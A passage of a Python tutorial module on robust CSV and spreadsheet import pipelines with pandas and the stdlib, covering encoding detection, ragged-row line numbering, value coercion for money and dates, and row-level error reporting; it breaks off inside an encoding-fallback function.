"""
Pandas for Tabular Data — Backend Import Pipelines
===================================================

The other file in this folder (04) *writes* Excel/CSV.  This one *reads* them:
a user uploads a messy spreadsheet and we must turn it into validated rows in
the database without OOM-ing the container or silently corrupting data.

Covers every pattern taught in the theory doc:
  - Generating a deliberately messy sample CSV (stdlib — always runs)
  - Encoding detection with a fallback ladder (utf-8-sig → cp1252 → latin-1)
  - Ragged-line pre-scan with EXACT user-facing line numbers  (stdlib csv)
  - Safe read_csv signature  (dtype=str, na_values, on_bad_lines)
  - Header normalisation + duplicate-column detection
  - Value coercion: money (Decimal / paise), dates, booleans, integers
  - Row-level error reporting: RowError + ImportReport response shape
  - Vectorised validation masks (never df.iterrows())
  - Chunked processing for big files (constant peak memory)
  - Memory measurement + usecols / category dtype levers
  - to_dict("records") → NaN→None → SQLAlchemy / Django bulk insert batching
  - Postgres COPY FROM STDIN for the 1M-row case
  - openpyxl read_only streaming (Excel has no chunksize)
  - polars equivalent (2026 alternative)
  - Security: zip-bomb check, CSV-injection sanitisation on export
  - FastAPI endpoint + background job shape

DEPENDENCIES
------------
  pip install "pandas>=2.2" openpyxl        # xlsx reading needs openpyxl
  pip install python-calamine               # optional: 5-20x faster xlsx reader
  pip install "polars>=1.0"                 # optional: the fast alternative
  pip install sqlalchemy                    # optional: bulk-insert demo

Every third-party import is guarded.  The __main__ block runs END TO END with
ZERO third-party packages installed — it generates the messy CSV, runs a pure
stdlib import pipeline over it, and then runs the pandas pipeline only if
pandas is importable (otherwise it prints the pip command and moves on).

Run it:
    python3 05_pandas_tabular_backend.py
"""

from __future__ import annotations

import csv
import io
import logging
import os
import re
import tempfile
import warnings
from dataclasses import dataclass, field
from datetime import date, datetime
from decimal import Decimal, InvalidOperation
from typing import Any, Callable, Dict, Iterator, List, Optional, Sequence, Set, Tuple

log = logging.getLogger(__name__)


# ==========================================================================
# 0. DECISION TABLE — which tool for which job
# ==========================================================================
# Kept as data (not just a comment) so it can be printed in the demo and so a
# reader can grep for it.  This is the first question in any import task.

TOOL_DECISION_TABLE: List[Dict[str, str]] = [
    {
        "tool": "csv (stdlib)",
        "use_when": "Pure CSV, row-by-row streaming, constant memory, zero deps",
        "avoid_when": "Excel input, or you need column-wide coercion/validation",
    },
    {
        "tool": "openpyxl (read_only)",
        "use_when": ".xlsx with merged cells/formulas/odd sheets, per-cell control",
        "avoid_when": "Large files without read_only=True — it is slow and RAM-hungry",
    },
    {
        "tool": "pandas",
        "use_when": "Mixed CSV/Excel, dtype coercion, vectorised validation, chunking",
        "avoid_when": "Tiny files (import cost ~0.5s) or multi-GB with tight RAM",
    },
    {
        "tool": "polars",
        "use_when": "Big files, strict schemas, speed/memory matter, greenfield code",
        "avoid_when": "Team does not know it; surrounding code expects a DataFrame",
    },
    {
        "tool": "pyarrow.csv",
        "use_when": "Multi-GB CSV → Parquet/Arrow, zero-copy handoff",
        "avoid_when": "Excel input, or fiddly per-row error reporting",
    },
]


# ==========================================================================
# 1. SAMPLE MESSY CSV GENERATOR  (stdlib only — always runs)
# ==========================================================================
# Every defect below is one we have actually seen in production uploads.
# The generator writes raw bytes (not str) so we can control the encoding and
# inject a UTF-8 BOM and a non-breaking space precisely.

MESSY_CSV_NOTES = """
Defects deliberately baked into the generated file:

  L1  UTF-8 BOM (\\xef\\xbb\\xbf) before the header  → header key becomes
      '\\ufeffSKU' and every df["SKU"] lookup raises KeyError.
  L1  Header names with trailing spaces and mixed case ('Unit Price ').
  L3  SKU with leading zeros ('007123') → int64 inference destroys it.
  L4  20-digit account number → float64 inference loses the last digits.
  L5  Money with thousands separator and currency symbol ('₹1,234.56').
  L6  Accounting-style negative in parentheses ('(500.00)').
  L7  Date in dd/mm/yyyy — ambiguous with mm/dd/yyyy.
  L8  Literal string 'NULL' in a status column — pandas turns it into NaN
      by default, destroying a meaningful value.
  L9  Empty required field (email).
  L10 Malformed email.
  L11 Negative quantity.
  L12 Non-numeric quantity ('two').
  L13 Non-breaking space (\\xa0) inside a name — .strip() does NOT remove it.
  L14 Duplicate email (same as an earlier row, different case).
  L15-16 Quoted field containing a comma AND an embedded newline — this ONE
      record spans TWO physical lines, so every later line number shifts and
      'line number' stops equalling 'record number'.
  L17 Ragged row: one extra field → default on_bad_lines='error' kills the
      whole import.
  L18 A trailing 'TOTAL' summary row that is not data.

Note how L15-16 pushes the ragged row to line 17 and the TOTAL row to line
18.  That shift is precisely why the stdlib pre-scan (section 3) exists: a
naive `df.index + 2` would report both of them one line too early.
"""

MESSY_HEADER = "SKU,Product Name , Email,Quantity,Unit Price ,Invoice Date,Status,Notes"


def generate_messy_csv(path: str) -> str:
    """
    Write a small CSV containing every classic upload defect.

    We write bytes directly rather than using csv.writer for the whole file
    because some of the defects (BOM, ragged row, raw non-breaking space) are
    exactly the things a well-behaved writer would prevent.

    Args:
        path: Destination file path.

    Returns:
        The path that was written (for convenient chaining).
    """
    nbsp = " "  # non-breaking space — survives .strip()

    lines: List[str] = [
        MESSY_HEADER,
        # --- well-formed baseline row ---
        "SKU-1001,Blue Widget,alice@example.com,3,49.99,01/03/2024,active,First order",
        # --- leading zeros: 007123 must NOT become 7123 ---
        "007123,Zero Padded Widget,bob@example.com,10,19.50,02/03/2024,active,Leading zeros",
        # --- 20-digit account-ish code: float64 would round it ---
        "00012345678901234567,Long Code Item,carol@example.com,1,5.00,03/03/2024,active,Big int",
        # --- currency symbol + thousands separator ---
        'SKU-1004,Premium Widget,dave@example.com,2,"₹1,234.56",04/03/2024,active,Currency symbol',
        # --- accounting negative in parentheses ---
        "SKU-1005,Credit Note Item,erin@example.com,1,(500.00),05/03/2024,refunded,Parenthesised negative",
        # --- dd/mm/yyyy that is ALSO valid as mm/dd/yyyy ---
        "SKU-1006,Ambiguous Date Item,frank@example.com,4,15.00,03/04/2024,active,Ambiguous date",
        # --- literal NULL string in a meaningful column ---
        "SKU-1007,Null Status Item,grace@example.com,5,22.00,06/03/2024,NULL,Literal NULL",
        # --- empty required field ---
        "SKU-1008,No Email Item,,2,10.00,07/03/2024,active,Missing email",
        # --- malformed email ---
        "SKU-1009,Bad Email Item,not-an-email,1,12.00,08/03/2024,active,Malformed email",
        # --- negative quantity ---
        "SKU-1010,Negative Qty Item,henry@example.com,-3,8.00,09/03/2024,active,Negative qty",
        # --- non-numeric quantity ---
        "SKU-1011,Word Qty Item,ivy@example.com,two,9.00,10/03/2024,active,Non-numeric qty",
        # --- non-breaking space inside the name ---
        f"SKU-1012,Sticky{nbsp}Space Item,jack@example.com,1,7.25,11/03/2024,active,NBSP in name",
        # --- duplicate email, different case (dedupe must be case-insensitive) ---
        "SKU-1013,Duplicate Buyer Item,ALICE@example.com,2,49.99,12/03/2024,active,Duplicate email",
        # --- quoted field with comma AND embedded newline (record spans 2 lines) ---
        'SKU-1014,Multiline Note Item,kate@example.com,1,33.00,13/03/2024,active,"Line one, with comma\nLine two"',
        # --- ragged row: 9 fields instead of 8 ---
        "SKU-1015,Ragged Item,leo@example.com,1,11.00,14/03/2024,active,Extra,FIELD",
        # --- trailing summary row that is not data ---
        "TOTAL,,,32,1934.30,,,",
    ]

    body = "\n".join(lines) + "\n"
    with open(path, "wb") as fh:
        fh.write(b"\xef\xbb\xbf")            # UTF-8 BOM, exactly as Excel writes it
        fh.write(body.encode("utf-8"))
    log.info("Generated messy sample CSV at %s (%d bytes)", path, os.path.getsize(path))
    return path


EXPECTED_COLUMNS = [
    "sku", "product_name", "email", "quantity",
    "unit_price", "invoice_date", "status", "notes",
]


# ==========================================================================
# 2. ENCODING DETECTION — the fallback ladder
# ==========================================================================
# Three encodings cover ~99% of real uploads:
#   utf-8-sig : Excel "Save as CSV UTF-8"          → eats the BOM for you
#   cp1252    : Windows Excel / older exports      → smart quotes, en-dashes
#   latin-1   : last resort — NEVER raises, because every byte 0x00-0xFF is a
#               valid Latin-1 codepoint.  May mojibake, but you get something
#               to show the user instead of a 500.

ENCODING_LADDER: Tuple[str, ...] = ("utf-8-sig", "utf-8", "cp1252", "latin-1")


def detect_encoding(path: str, sample_bytes: int = 65_536) -> str:
    """
    Guess a file's text encoding by trial decoding of the first chunk.

    Reading only a prefix is deliberate: a 500 MB file should not be decoded
    four times just to pick an encoding.  The risk is that a bad byte lives
    past the sample — hence the readers below still handle UnicodeDecodeError.

    If `charset-normalizer` is installed (pip install charset-normalizer) it
    gives a better statistical guess; we use it when available.

    Args:
        path:         File to inspect.
        sample_bytes: How many leading bytes to test.

    Returns:
        An encoding name from ENCODING_LADDER (or one charset-normalizer
        suggested).  Never raises — worst case returns "latin-1".
    """
    with open(path, "rb") as fh:
        head = fh.read(sample_bytes)

    # BOM sniffing is cheap and definitive when present.
    if head.startswith(b"\xef\xbb\xbf"):
        return "utf-8-sig"
    if head.startswith((b"\xff\xfe", b"\xfe\xff")):
        return "utf-16"

    try:
        from charset_normalizer import from_bytes  # type: ignore

        best = from_bytes(head).best()
        if best is not None and best.encoding:
            return str(best.encoding)
    except ImportError:
        pass  # optional dependency; the ladder below is a fine substitute

    for enc in ENCODING_LADDER:
        try:
            head.decode(enc)
            return enc
        except UnicodeDecodeError:
            continue
    return "latin-1"


def detect_delimiter(path: str, encoding: str, sample_bytes: int = 8192) -> str:
    """
    Sniff the field delimiter.  European Excel exports use ';' not ','.

    csv.Sniffer is imperfect but good enough on a header line.  We restrict
    the candidate set because Sniffer will otherwise "discover" creative
    delimiters inside free-text notes fields.

    Args:
        path:         File to inspect.
        encoding:     Encoding to decode the sample with.
        sample_bytes: Bytes of the file to sniff.

    Returns:
        A single-character delimiter; defaults to ',' when unsure.
    """
    with open(path, "r", encoding=encoding, newline="") as fh:
        sample = fh.read(sample_bytes)
    try:
        return csv.Sniffer().sniff(sample, delimiters=",;\t|").delimiter
    except csv.Error:
        return ","


# ==========================================================================
# 3. RAGGED-LINE PRE-SCAN — exact user-facing line numbers  (stdlib)
# ==========================================================================
# THE classic bug in import endpoints: reporting the DataFrame index as the
# row number.  It is wrong for three compounding reasons:
#   (a) the index is 0-based and the file has a header  → off by 2
#   (b) skipped bad lines shift everything after them
#   (c) a quoted field with an embedded newline makes one RECORD span several
#       LINES, so "record number" and "line number" diverge
#
# A stdlib csv pre-scan solves all three: csv.reader.line_num is the physical
# line number of the END of the record just read, so we can compute the exact
# start line of every record AND flag ragged ones — before pandas sees the
# file at all.  The scan is I/O-bound and cheap relative to parsing.


@dataclass
class ScannedRecord:
    """One physical record found during the pre-scan."""

    line_start: int      # 1-based physical line where this record begins
    n_fields: int        # how many fields the record actually had


@dataclass
class ScanResult:
    """Outcome of the stdlib pre-scan of a delimited file."""

    header: List[str]
    header_line: int
    expected_fields: int
    good: List[ScannedRecord] = field(default_factory=list)
    ragged: List[ScannedRecord] = field(default_factory=list)

    @property
    def good_line_numbers(self) -> List[int]:
        """User-facing line numbers of the records pandas will actually parse."""
        return [r.line_start for r in self.good]


def scan_delimited_file(path: str, encoding: str, delimiter: str = ",") -> ScanResult:
    """
    Walk the file once with the stdlib csv reader, recording line geometry.

    This gives us three things pandas cannot easily provide:
      1. The exact physical line number of every record (embedded-newline safe).
      2. Which records are ragged, and where.
      3. The true header, before any normalisation.

    Args:
        path:      File to scan.
        encoding:  Text encoding (from detect_encoding).
        delimiter: Field delimiter (from detect_delimiter).

    Returns:
        A ScanResult.  Raises ValueError only if the file has no header row.
    """
    result: Optional[ScanResult] = None

    with open(path, "r", encoding=encoding, newline="") as fh:
        reader = csv.reader(fh, delimiter=delimiter)
        previous_line = 0

        for record in reader:
            start = previous_line + 1
            previous_line = reader.line_num

            if result is None:
                # First record is the header.
                result = ScanResult(
                    header=record,
                    header_line=start,
                    expected_fields=len(record),
                )
                continue

            if not any(cell.strip() for cell in record):
                continue  # blank line — harmless, skip silently

            scanned = ScannedRecord(line_start=start, n_fields=len(record))
            if len(record) == result.expected_fields:
                result.good.append(scanned)
            else:
                result.ragged.append(scanned)

    if result is None:
        raise ValueError("File is empty — no header row found")
    return result


# ==========================================================================
# 4. HEADER NORMALISATION
# ==========================================================================

_BOM = "﻿"
_NBSP = " "


def normalise_header(name: str) -> str:
    """
    Turn a human header cell into a stable snake_case key.

    Handles, in order: stray BOM, non-breaking spaces, surrounding whitespace,
    case, and internal whitespace/punctuation runs.  Trailing spaces in headers
    ("Email " vs "Email") are the single most common cause of a baffling
    KeyError in import code.

    Args:
        name: Raw header cell text.

    Returns:
        A lowercase snake_case identifier.
    """
    cleaned = name.replace(_BOM, "").replace(_NBSP, " ").strip().lower()
    cleaned = re.sub(r"[^\w]+", "_", cleaned)   # spaces, dashes, slashes → _
    return cleaned.strip("_")


def check_header(
    raw_header: Sequence[str],
    expected: Sequence[str],
) -> Tuple[List[str], List[str], List[str]]:
    """
    Normalise a header row and diff it against the expected schema.

    Duplicate columns are a real hazard: Excel exports happily contain two
    'Amount' columns, and pandas silently renames the second to 'Amount.1'.
    We surface them instead of guessing which one the user meant.

    Args:
        raw_header: Header cells as read from the file.
        expected:   Column keys the importer requires.

    Returns:
        (normalised_header, missing_columns, duplicate_columns)
    """
    normalised = [normalise_header(h) for h in raw_header]

    seen: Set[str] = set()
    duplicates: List[str] = []
    for col in normalised:
        if col in seen and col not in duplicates:
            duplicates.append(col)
        seen.add(col)

    missing = [c for c in expected if c not in seen]
    return normalised, missing, duplicates


# ==========================================================================
# 5. VALUE COERCION — money, dates, integers, booleans
# ==========================================================================
# Rule: read everything as text, then coerce EXPLICITLY.  Every coercion
# returns (value, error_message) so the caller can turn a failure into a
# user-facing RowError rather than a silent NaN.

_CURRENCY_CHARS = re.compile(r"[₹$€£¥,\s ]")
_PARENS_NEGATIVE = re.compile(r"^\((.*)\)$")


def clean_text(value: Optional[str]) -> str:
    """
    Normalise a free-text cell: NBSP → space, collapse runs, strip.

    .strip() alone does NOT remove U+00A0, which is what you get when someone
    pastes from a web page into Excel.  The value then fails an equality check
    against an apparently identical string, which is maddening to debug.
    """
    if value is None:
        return ""
    return re.sub(r"\s+", " ", str(value).replace(_NBSP, " ")).strip()


def parse_money_to_minor_units(value: Optional[str]) -> Tuple[Optional[int], Optional[str]]:
    """
    Parse a messy money string into integer minor units (paise / cents).

    Handles: currency symbols, thousands separators, non-breaking spaces, and
    accounting-style parenthesised negatives ("(500.00)" → -50000).

    NEVER use float for money.  0.1 + 0.2 != 0.3, and a cent of drift across a
    100k-row import turns into a reconciliation ticket.  Decimal for the maths,
    int minor units for storage and transport.

    Args:
        value: Raw cell text.

    Returns:
        (minor_units, error_message).  Exactly one of the two is None.
    """
    text = clean_text(value)
    if not text:
        return None, "required"

    negative = False
    m = _PARENS_NEGATIVE.match(text)
    if m:
        negative = True
        text = m.group(1)

    text = _CURRENCY_CHARS.sub("", text)
    if text.startswith("-"):
        negative = True
        text = text[1:]

    if not text:
        return None, "not a valid amount"

    try:
        amount = Decimal(text).quantize(Decimal("0.01"))
    except (InvalidOperation, ValueError):
        return None, f"not a valid amount: {clean_text(value)!r}"

    minor = int(amount * 100)
    return (-minor if negative else minor), None


def parse_int(value: Optional[str]) -> Tuple[Optional[int], Optional[str]]:
    """
    Parse a whole number, tolerating "1,000", " 42 " and "42.0".

    Returns (value, error_message).
    """
    text = clean_text(value).replace(",", "")
    if not text:
        return None, "required"
    try:
        as_decimal = Decimal(text)
    except (InvalidOperation, ValueError):
        return None, f"must be a whole number, got {clean_text(value)!r}"
    if as_decimal != as_decimal.to_integral_value():
        return None, f"must be a whole number, got {clean_text(value)!r}"
    return int(as_decimal), None


# Excel stores dates as "days since 1899-12-30" (the famous 1900 leap-year bug
# means the epoch is the 30th, not the 31st).  If a user exports an Excel date
# column to CSV you can get 45301 instead of 2024-01-05.
EXCEL_EPOCH = date(1899, 12, 30)

# Formats are tried IN ORDER.  Put your documented upload-template format
# first; the rest are courtesy fallbacks.  dd/mm before mm/dd is a deliberate
# locale choice — state it in the template so it is never a guess.
DATE_FORMATS: Tuple[str, ...] = (
    "%d/%m/%Y", "%Y-%m-%d", "%d-%m-%Y", "%d.%m.%Y", "%d %b %Y", "%d %B %Y",
)


def parse_date(
    value: Optional[str],
    formats: Sequence[str] = DATE_FORMATS,
) -> Tuple[Optional[date], Optional[str]]:
    """
    Parse a date string, with Excel-serial support.

    The ambiguity trap: 03/04/2024 is 3 April in IN/UK and 4 March in the US.
    There is no way to detect this from the data — a column of such dates
    parses "successfully" either way.  The only real fix is a documented
    format in the upload template; this function makes that explicit rather
    than letting a library guess per-column from a sample.

    Args:
        value:   Raw cell text.
        formats: strptime formats to try, in priority order.

    Returns:
        (date, error_message).
    """
    text = clean_text(value)
    if not text:
        return None, "required"

    # Excel serial number (a bare integer in a plausible range: 1900..2100)
    if text.isdigit() and 1 <= int(text) <= 80_000:
        from datetime import timedelta

        return EXCEL_EPOCH + timedelta(days=int(text)), None

    for fmt in formats:
        try:
            return datetime.strptime(text, fmt).date(), None
        except ValueError:
            continue
    return None, f"unrecognised date {text!r} (expected DD/MM/YYYY)"


_TRUTHY = {"1", "true", "t", "yes", "y", "on"}
_FALSY = {"0", "false", "f", "no", "n", "off"}


def parse_bool(value: Optional[str]) -> Tuple[Optional[bool], Optional[str]]:
    """Parse a boolean-ish cell.  Returns (value, error_message)."""
    text = clean_text(value).lower()
    if not text:
        return None, "required"
    if text in _TRUTHY:
        return True, None
    if text in _FALSY:
        return False, None
    return None, f"expected yes/no, got {clean_text(value)!r}"


EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[A-Za-z]{2,}$")


def parse_email(value: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
    """
    Validate and normalise an email address.

    Deliberately permissive: full RFC 5322 validation rejects addresses that
    real mail servers accept.  For an import, "has a local part, an @, and a
    dotted domain" plus a later delivery check is the right trade.

    Returns (lowercased_email, error_message).
    """
    text = clean_text(value)
    if not text:
        return None, "required"
    if not EMAIL_RE.match(text):
        return None, f"not a valid email: {text!r}"
    return text.lower(), None


# ==========================================================================
# 6. ROW-LEVEL ERROR REPORTING
# ==========================================================================
# The difference between a backend engineer and a notebook user.  A user who
# uploads 5000 rows and receives {"error": "invalid data"} has no path
# forward.  They need: row, column, the offending value, and why.

MAX_INLINE_ERRORS = 100


@dataclass
class RowError:
    """A single validation failure, addressed the way the user sees their file."""

    row: int          # 1-based PHYSICAL LINE NUMBER in the uploaded file
    column: str
    value: str
    message: str

    def as_dict(self) -> Dict[str, Any]:
        return {
            "row": self.row,
            "column": self.column,
            "value": self.value,
            "message": self.message,
        }

    def __str__(self) -> str:  # pragma: no cover - cosmetic
        return f"row {self.row}, column {self.column!r}: {self.message} (value={self.value!r})"


@dataclass
class ImportReport:
    """
    Aggregated outcome of an import, shaped for the HTTP response.

    Design notes:
      - Errors are ACCUMULATED, never raised on first failure.  A user fixing
        one error at a time across 13 failures means 13 upload round-trips.
      - The inline error list is capped; the full set goes to a downloadable
        CSV.  A wrong-file upload otherwise produces a multi-megabyte JSON.
      - valid_rows is tracked separately from total_rows so the user can see
        "4987 of 5000 rows are importable".
    """

    total_rows: int = 0
    valid_rows: int = 0
    errors: List[RowError] = field(default_factory=list)
    error_count: int = 0
    warnings: List[str] = field(default_factory=list)

    def add_error(self, err: RowError) -> None:
        """Record an error, keeping only the first MAX_INLINE_ERRORS in memory."""
        self.error_count += 1
        if len(self.errors) < MAX_INLINE_ERRORS:
            self.errors.append(err)

    @property
    def ok(self) -> bool:
        return self.error_count == 0

    def as_dict(self, error_report_url: Optional[str] = None) -> Dict[str, Any]:
        """Serialise to the JSON body an import endpoint should return."""
        return {
            "status": "accepted" if self.ok else "rejected",
            "total_rows": self.total_rows,
            "valid_rows": self.valid_rows,
            "error_count": self.error_count,
            "errors": [e.as_dict() for e in self.errors],
            "errors_truncated": self.error_count > len(self.errors),
            "error_report_url": error_report_url,
            "warnings": self.warnings,
        }

    def write_error_csv(self, path: str) -> str:
        """
        Write the full error list to a CSV for download.

        In production this goes to S3 and the user gets a presigned URL.
        Note that only the first MAX_INLINE_ERRORS are retained here; a real
        implementation streams every error straight to the CSV as it is found
        and keeps only the head in memory.
        """
        with open(path, "w", newline="", encoding="utf-8") as fh:
            writer = csv.DictWriter(fh, fieldnames=["row", "column", "value", "message"])
            writer.writeheader()
            for err in self.errors:
                writer.writerow(err.as_dict())
        return path


# ==========================================================================
# 7. PURE-STDLIB IMPORT PIPELINE  (always runs — no pandas needed)
# ==========================================================================
# When the input is plain CSV and you process row-by-row into the DB with no
# column-level operations, the stdlib is genuinely the better tool: no
# dependency, no type-inference surprises, and truly constant memory.
# This is also the graceful-degradation path for the demo below.


@dataclass
class ProductRow:
    """A validated, typed row ready for the ORM."""

    sku: str
    product_name: str
    email: str
    quantity: int
    unit_price_minor: int
    invoice_date: date
    status: str
    notes: str

    def as_record(self) -> Dict[str, Any]:
        """Mapping suitable for SQLAlchemy insert() / Django Model(**kwargs)."""
        return {
            "sku": self.sku,
            "product_name": self.product_name,
            "email": self.email,
            "quantity": self.quantity,
            "unit_price_minor": self.unit_price_minor,
            "invoice_date": self.invoice_date,
            "status": self.status,
            "notes": self.notes,
        }


SUMMARY_ROW_MARKERS = {"total", "totals", "grand total", "sum", "subtotal"}


def _is_summary_row(record: Dict[str, str]) -> bool:
    """
    Detect the trailing 'TOTAL' row users leave in exports.

    Heuristic, deliberately conservative: the first column reads like a
    summary label AND at least one identifying field is blank.  Being wrong
    here silently drops a real row, so we also surface it as a warning.
    """
    first = clean_text(record.get("sku")).lower()
    return first in SUMMARY_ROW_MARKERS and not clean_text(record.get("email"))


def validate_record(
    record: Dict[str, str],
    line_no: int,
    seen_emails: Set[str],
    report: ImportReport,
) -> Optional[ProductRow]:
    """
    Coerce and validate one raw record into a ProductRow.

    Collects EVERY problem in the row rather than returning at the first one —
    a user should not have to fix the email, re-upload, and only then learn
    the quantity was also wrong.

    Args:
        record:      Raw {normalised_column: text} mapping.
        line_no:     Physical line number in the user's file (for error text).
        seen_emails: Emails already accepted, for in-file dedupe.  Mutated.
        report:      Accumulator for RowErrors.

    Returns:
        A ProductRow if every field validated, else None.
    """
    failed = False

    def fail(column: str, message: str) -> None:
        nonlocal failed
        failed = True
        report.add_error(
            RowError(row=line_no, column=column,
                     value=clean_text(record.get(column)), message=message)
        )

    sku = clean_text(record.get("sku"))
    if not sku:
        fail("sku", "required")
    elif len(sku) > 64:
        fail("sku", "longer than 64 characters")

    name = clean_text(record.get("product_name"))
    if not name:
        fail("product_name", "required")

    email, err = parse_email(record.get("email"))
    if err:
        fail("email", err)
    elif email in seen_emails:
        fail("email", "duplicate in file")
        email = None

    quantity, err = parse_int(record.get("quantity"))
    if err:
        fail("quantity", err)
    elif quantity is not None and quantity <= 0:
        fail("quantity", "must be greater than zero")

    price_minor, err = parse_money_to_minor_units(record.get("unit_price"))
    if err:
        fail("unit_price", err)
    elif price_minor is not None and price_minor < 0:
        fail("unit_price", "must not be negative")

    invoice_date, err = parse_date(record.get("invoice_date"))
    if err:
        fail("invoice_date", err)

    # 'NULL' as a literal string is a real status in some source systems.
    # We keep it verbatim rather than letting a parser turn it into missing.
    status = clean_text(record.get("status")) or "unknown"

    if failed:
        return None

    assert email is not None and quantity is not None
    assert price_minor is not None and invoice_date is not None
    seen_emails.add(email)

    return ProductRow(
        sku=sku,
        product_name=name,
        email=email,
        quantity=quantity,
        unit_price_minor=price_minor,
        invoice_date=invoice_date,
        status=status,
        notes=clean_text(record.get("notes")),
    )


def import_with_stdlib_csv(
    path: str,
    batch_size: int = 500,
    sink: Optional[Callable[[List[Dict[str, Any]]], None]] = None,
) -> Tuple[ImportReport, List[ProductRow]]:
    """
    End-to-end import using only the standard library.

    Memory profile: one record plus one batch at a time.  A 10 GB CSV imports
    in the same RSS as a 10 KB one.  This is the pattern to reach for when the
    input is definitely CSV and you do not need column-wide operations.

    Args:
        path:       CSV file to import.
        batch_size: Rows per bulk-insert batch handed to `sink`.
        sink:       Called with each batch of dict records (simulates the DB).

    Returns:
        (ImportReport, list_of_valid_rows)
    """
    encoding = detect_encoding(path)
    delimiter = detect_delimiter(path, encoding)
    log.info("stdlib import: encoding=%s delimiter=%r", encoding, delimiter)

    report = ImportReport()
    valid_rows: List[ProductRow] = []
    seen_emails: Set[str] = set()
    batch: List[Dict[str, Any]] = []

    with open(path, "r", encoding=encoding, newline="") as fh:
        reader = csv.reader(fh, delimiter=delimiter)

        try:
            raw_header = next(reader)
        except StopIteration:
            report.warnings.append("File is empty")
            return report, valid_rows

        header, missing, duplicates = check_header(raw_header, EXPECTED_COLUMNS)
        if duplicates:
            report.warnings.append(f"Duplicate columns in header: {duplicates}")
        if missing:
            report.warnings.append(f"Missing expected columns: {missing}")

        expected_fields = len(header)
        previous_line = reader.line_num

        for record_fields in reader:
            line_start = previous_line + 1
            previous_line = reader.line_num

            if not any(cell.strip() for cell in record_fields):
                continue

            # Ragged rows: report them with their real line number instead of
            # letting a parser abort the whole import.
            if len(record_fields) != expected_fields:
                report.total_rows += 1
                report.add_error(RowError(
                    row=line_start,
                    column="<row>",
                    value=delimiter.join(record_fields)[:120],
                    message=(f"expected {expected_fields} columns, "
                             f"found {len(record_fields)}"),
                ))
                continue

            record = dict(zip(header, record_fields))

            if _is_summary_row(record):
                report.warnings.append(
                    f"Line {line_start} looks like a summary/TOTAL row — skipped"
                )
                continue

            report.total_rows += 1
            row = validate_record(record, line_start, seen_emails, report)
            if row is None:
                continue

            report.valid_rows += 1
            valid_rows.append(row)
            batch.append(row.as_record())

            if len(batch) >= batch_size:
                if sink:
                    sink(batch)
                batch = []

    if batch and sink:
        sink(batch)

    return report, valid_rows


# ==========================================================================
# 8. PANDAS — the safe read_csv signature
# ==========================================================================
# pip install "pandas>=2.2"


def _require_pandas(feature: str):
    """
    Import pandas or warn with the pip command and return None.

    Every pandas-dependent function in this file starts with this call so the
    module remains importable and demonstrable on a machine with no pandas.
    """
    try:
        import pandas as pd  # type: ignore

        return pd
    except ImportError:
        warnings.warn(
            f"pandas not installed — skipping {feature}. "
            'Run: pip install "pandas>=2.2" openpyxl',
            ImportWarning,
            stacklevel=2,
        )
        return None


def read_csv_safely(
    source: Any,
    usecols: Optional[Sequence[str]] = None,
    encoding: Optional[str] = None,
    delimiter: Optional[str] = None,
) -> Any:
    """
    Read a CSV with the only signature that is safe in a backend.

    `pd.read_csv(path)` with defaults is a loaded gun.  Each argument below
    disarms a specific, silent, data-corrupting default:

      dtype=str
          Type inference is per-column, sampled, and IRREVERSIBLE.  "007" →
          7 (leading zeros gone from SKUs / PIN codes / phone numbers).
          "1e5" → 100000.0.  A 20-digit account number → float64, which
          cannot represent it, so the last digits change — with NO exception
          raised.  Read as text, coerce explicitly, report failures.

      keep_default_na=False + na_values=[""]
          By default pandas treats "NA", "N/A", "NULL", "None", "nan", "#N/A"
          and more as missing.  If your data has a country "NA" (Namibia) or
          a status literally called "NULL", the defaults destroy it.

      encoding="utf-8-sig"
          Eats the BOM Excel writes; otherwise the first column is named
          "\\ufeffSKU" and every lookup raises KeyError.

      engine="python", sep=None
          The python engine is ~3-5x slower but tolerant, and it is the only
          one that can auto-sniff the separator (European exports use ';').

      on_bad_lines
          The default is "error": ONE ragged row kills a 100k-row import.
          "skip" silently discards data.  We collect instead.

      usecols
          Do not materialise columns you will never read.  This is the single
          biggest memory lever available.

    Args:
        source:    Path, file object, or BytesIO.
        usecols:   Restrict to these columns (post-normalisation names will
                   not match raw headers, so pass raw names or None).
        encoding:  Override the detected encoding.
        delimiter: Override the sniffed delimiter.

    Returns:
        A DataFrame with every column as string dtype, or None if pandas is
        unavailable.
    """
    pd = _require_pandas("read_csv_safely")
    if pd is None:
        return None

    kwargs: Dict[str, Any] = {
        "dtype": str,                    # (1) never infer
        "keep_default_na": False,        # (2) do not invent missingness
        "na_values": [""],               # (3) only truly empty cells are NA
        "encoding": encoding or "utf-8-sig",
        "engine": "python",              # (5) tolerant parser
        "skipinitialspace": True,
        "on_bad_lines": "warn",          # (6) never silently drop
    }
    if delimiter is None:
        kwargs["sep"] = None             # auto-sniff (python engine only)
    else:
        kwargs["sep"] = delimiter
    if usecols:
        kwargs["usecols"] = list(usecols)

    df = pd.read_csv(source, **kwargs)

    # Normalise headers immediately — before ANY column is referenced by name.
    df.columns = [normalise_header(c) for c in df.columns]
    return df


def read_csv_collecting_bad_lines(source: Any, encoding: str = "utf-8-sig"):
    """
    Read a CSV while CAPTURING malformed rows instead of dying or dropping.

    pandas >= 1.4 accepts a callable for on_bad_lines (python engine).  The
    callable receives the split fields of the offending line; returning None
    skips it, returning a list of the right width substitutes a repaired row.

    IMPORTANT LIMITATION: the callable does NOT receive the line number, so
    the captured rows cannot be addressed back to the user's file from here.
    That is exactly why scan_delimited_file() exists — run the stdlib pre-scan
    to get exact line numbers, then read with pandas for the column work.

    Args:
        source:   Path or file-like object.
        encoding: Text encoding.

    Returns:
        (DataFrame, list_of_bad_rows) — or (None, []) without pandas.
    """
    pd = _require_pandas("read_csv_collecting_bad_lines")
    if pd is None:
        return None, []

    bad_rows: List[List[str]] = []

    def collect_bad(row: List[str]) -> None:
        bad_rows.append(row)
        return None  # returning None tells pandas to skip this line

    try:
        df = pd.read_csv(
            source,
            dtype=str,
            keep_default_na=False,
            na_values=[""],
            encoding=encoding,
            engine="python",
            on_bad_lines=collect_bad,
        )
    except (TypeError, ValueError):
        # Older pandas does not accept a callable here.
        if hasattr(source, "seek"):
            source.seek(0)
        df = pd.read_csv(
            source, dtype=str, keep_default_na=False, na_values=[""],
            encoding=encoding, engine="python", on_bad_lines="skip",
        )

    df.columns = [normalise_header(c) for c in df.columns]
    return df, bad_rows


def read_with_encoding_fallback(raw: bytes):
    """
    Decode-and-parse ladder for bytes of unknown provenance.

    latin-1 is the terminal fallback precisely because it CANNOT raise: every
